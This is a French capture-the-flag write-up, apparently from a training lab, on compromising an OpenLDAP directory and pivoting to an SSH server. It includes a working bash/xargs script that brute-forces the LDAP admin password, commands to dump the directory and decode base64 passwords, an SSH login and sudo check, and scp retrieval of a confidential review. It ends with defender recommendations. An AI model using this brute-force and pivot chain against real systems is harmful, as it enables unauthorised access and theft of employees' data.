# Write-up : LDAP compromission

## Contexte

Ce challenge simule un audit de securite interne pour l'entreprise CORPLocal. L'infrastructure repose sur un annuaire OpenLDAP centralisant l'authentification des employes, des comptes de service et des groupes. Un serveur SSH est egalement present sur le reseau. L'objectif est de compromettre l'annuaire LDAP, recuperer un flag cache, puis pivoter vers le serveur SSH pour acceder a un document confidentiel.

Deux machines sont en jeu :

- **11.10.10.89** : serveur LDAP
- **11.10.10.90** : serveur SSH

---

## Etape 1 : Reconnaissance avec nmap

On commence par scanner les deux machines pour identifier les services exposes.

### Scan de la machine .89 (serveur LDAP)

```bash
nmap -sC -sV -Pn -nvv 11.10.10.89 -oA initial_tcp
```

Resultat : deux ports ouverts.

| Port | Service | Details |
|------|---------|---------|
| 389  | LDAP    | OpenLDAP 2.2.X - 2.3.X |
| 636  | LDAPS   | TLS avec certificat auto-signe |

Le certificat SSL revele des informations interessantes :

- **Organisation** : A1A Car Wash 
- **Localisation** : Albuquerque, New Mexico
- **CN** : docker-light-baseimage (confirme un environnement Docker)
- **Certificat CA expire** le 15 janvier 2026

### Scan de la machine .90 (serveur SSH)

```bash
nmap -sC -sV -Pn -nvv 11.10.10.90 -oA initial_tcp
```

Resultat : un seul port ouvert.

| Port | Service | Details |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.4p1 Debian |

### Ce qu'on retient

Trois ports ouverts au total (389, 636, 22). Le serveur LDAP est la cible principale pour obtenir des credentials qui permettront de se connecter en SSH.

---

## Etape 2 : Enumeration LDAP

### Recuperation du base DN

La premiere etape avec un serveur LDAP est de decouvrir le base DN (Distinguished Name racine de l'annuaire). On interroge le rootDSE, qui est toujours accessible en anonyme :

```bash
ldapsearch -x -h 11.10.10.89 -p 389 -s base namingcontexts
```

Resultat :

```
namingContexts: dc=corp,dc=local
```

Le domaine est donc **corp.local**.

### Tentative d'acces anonyme

On tente un dump complet de l'annuaire sans authentification :

```bash
ldapsearch -x -h 11.10.10.89 -b "dc=corp,dc=local" "(objectClass=*)"
```

Resultat : `result: 32 No such object`. Le bind anonyme n'a pas les droits de lecture sur l'arbre. Meme resultat en filtrant sur `objectClass=person` ou `cn=admin`. L'acces anonyme est verrouille.

### Tentative via LDAPS (port 636)

Le port 636 est ouvert mais le certificat CA est expire, ce qui empeche toute connexion TLS. Meme avec `LDAPTLS_REQCERT=never`, la connexion echoue car le serveur coupe le handshake SSL.

---

## Etape 3 : Brute force du mot de passe admin

Puisque l'acces anonyme est bloque, il faut trouver le mot de passe du compte admin LDAP. Le DN admin standard pour OpenLDAP est `cn=admin,dc=corp,dc=local`.

### Probleme avec Hydra

Hydra est l'outil classique pour le brute force LDAP, mais la version 9.6 a un bug : elle interprete les virgules dans le DN comme des separateurs d'arguments et refuse de combiner `-l` avec `-m`. Apres plusieurs tentatives de contournement, il faut abandonner Hydra pour cette cible.

### Brute force en bash avec xargs

On cree un script bash qui teste chaque mot de passe de la wordlist en parallele. Le point subtil est de verifier le **succes** du bind plutot que l'absence d'erreur (sinon les erreurs de parsing donnent des faux positifs) :

```bash
head -50000 ~/path/to/rockyou.txt > /tmp/top50k.txt

cat /tmp/top50k.txt | xargs -P 16 -I {} sh -c '
  result=$(ldapsearch -x -h 11.10.10.89 \
    -D "cn=admin,dc=corp,dc=local" \
    -w "{}" \
    -b "dc=corp,dc=local" 2>&1)
  if echo "$result" | grep -q "result: 0 Success"; then
    echo ">>> FOUND: {}"
    echo "$result"
  fi
'
```

Points importants :

- **`-P 16`** : 16 processus en parallele pour accelerer le brute force
- **Grep sur "result: 0 Success"** : on cherche un bind reussi, pas l'absence d'erreur. C'est essentiel car certains mots de passe contenant des caracteres speciaux (`!`, `$`, etc.) peuvent faire crasher `ldapsearch` sans retourner "Invalid credentials", generant des faux positifs
- **Top 50k de rockyou** : les mots de passe les plus frequents sont en tete du fichier, inutile de tester les 14 millions d'entrees

### Resultat

```
>>> FOUND: str0ngp@sswOrd!
```

Le mot de passe admin est **str0ngp@sswOrd!**.

---

## Etape 4 : Dump complet de l'annuaire LDAP

Avec les credentials admin, on peut maintenant lire l'integralite de l'annuaire :

```bash
ldapsearch -x -h 11.10.10.89 \
  -D "cn=admin,dc=corp,dc=local" \
  -w "str0ngp@sswOrd!" \
  -b "dc=corp,dc=local" \
  "(objectClass=*)"
```

### Structure de l'annuaire

L'annuaire contient 9 entrees organisees ainsi :

```
dc=corp,dc=local
├── ou=People
│   ├── uid=alice (Alice Smith, groupe admins)
│   └── uid=bob (Bob Jones, groupe hr)
├── ou=Groups
│   ├── cn=admins (membre: alice)
│   └── cn=hr (membre: bob)
└── ou=Services
    └── uid=svc_backup (compte de service)
```

### Donnees sensibles extraites

**Comptes utilisateurs avec mots de passe** : les attributs `userPassword` sont stockes en base64.

| Utilisateur | userPassword (base64) | Mot de passe en clair |
|-------------|----------------------|----------------------|
| alice       | MG9wc0lkaWRpdEBnYWlu | 0opsIdidit@gain      |
| bob         | Ym9iMTIz             | bob123               |

Decodage :

```bash
echo "MG9wc0lkaWRpdEBnYWlu" | base64 -d
# 0opsIdidit@gain

echo "Ym9iMTIz" | base64 -d
# bob123
```

**Flag cache** : dans le champ `departmentNumber` du compte de service `svc_backup` :

```
departmentNumber: Jedha{Hidden_Flag!}
```

### Problemes de securite identifies

1. **Mots de passe en base64** : base64 n'est pas du chiffrement, c'est un simple encodage reversible. Les mots de passe devraient etre haches avec SSHA ou PBKDF2.
2. **Flag dans un attribut metier** : le champ `departmentNumber` est detourne pour stocker des donnees sensibles, ce qui montre l'importance d'auditer tous les attributs LDAP.
3. **Mot de passe admin brute-forcable** : malgre sa complexite apparente, `str0ngp@sswOrd!` est present dans rockyou.

---

## Etape 5 : Pivot SSH et escalade de privileges

### Connexion SSH avec le compte alice

Alice est membre du groupe `admins`. On tente une connexion SSH sur la machine .90 :

```bash
ssh alice@11.10.10.90
# Mot de passe : 0opsIdidit@gain
```

Connexion reussie.

### Verification des privileges sudo

```bash
alice@d2de6c330cc7:~$ sudo -l
User alice may run the following commands on d2de6c330cc7:
    (ALL) NOPASSWD: ALL
```

Alice a les droits sudo complets sans mot de passe. C'est coherent avec son appartenance au groupe `admins`.

### Recuperation de la performance review de Bob

Le fichier recherche se trouve directement dans le home d'alice :

```bash
alice@d2de6c330cc7:~$ ls /home/alice/
performance_review_BobJones.pdf
```

Pour le recuperer sur la machine locale :

```bash
# Depuis la machine attaquante
scp alice@11.10.10.90:/home/alice/performance_review_BobJones.pdf ~/
```

---

## Resume de la kill chain

```
Reconnaissance (nmap)
    │
    ▼
Enumeration LDAP anonyme (base DN: dc=corp,dc=local)
    │
    ▼
Brute force du compte admin LDAP (str0ngp@sswOrd!)
    │
    ▼
Dump de l'annuaire → credentials alice/bob + flag
    │
    ▼
Connexion SSH avec alice (0opsIdidit@gain)
    │
    ▼
sudo ALL NOPASSWD → acces root
    │
    ▼
Recuperation de performance_review_BobJones.pdf
```

---

## Recommandations

### Pour les defenseurs

1. **Desactiver le bind anonyme** ou au minimum restreindre les attributs visibles. Ici le bind anonyme ne permettait pas de lire l'arbre, ce qui est bien, mais le rootDSE revelait le base DN.

2. **Hacher les mots de passe** avec SSHA ou PBKDF2 au lieu de les stocker en base64. Un simple `base64 -d` suffit a les recuperer en clair.

3. **Politique de mots de passe robuste** : le mot de passe admin, malgre sa complexite apparente avec des substitutions de caracteres (0 pour o, @ pour a), etait present dans rockyou. Les politiques doivent imposer des mots de passe longs et uniques, idealement generes aleatoirement.

4. **Principe du moindre privilege** : alice n'a probablement pas besoin de `sudo ALL NOPASSWD`. Les droits sudo devraient etre restreints aux commandes necessaires.

5. **Audit des attributs LDAP** : des donnees sensibles peuvent se cacher dans des attributs inattendus comme `departmentNumber`. Un audit regulier de tous les attributs est necessaire.

6. **Activer le rate limiting** sur les binds LDAP pour ralentir les attaques par brute force.

### Pour les attaquants

1. **Toujours commencer par le rootDSE** : il est accessible sans authentification et revele le base DN, les mecanismes SASL supportes, et les extensions disponibles.

2. **Regarder les certificats SSL** : ils contiennent souvent des indices sur l'organisation, les noms d'hotes internes, et le contexte.

3. **Adapter les outils** : quand un outil comme Hydra ne fonctionne pas, un simple script bash avec xargs peut faire le travail de maniere fiable.

4. **Decoder tous les attributs** : les mots de passe en base64 sont un cadeau. Toujours verifier les attributs `userPassword`, `description`, `departmentNumber`, et autres champs qui pourraient contenir des informations utiles.

5. **Verifier le succes, pas l'absence d'erreur** : lors du brute force, grep sur un indicateur de succes positif evite les faux positifs causes par des erreurs de parsing.
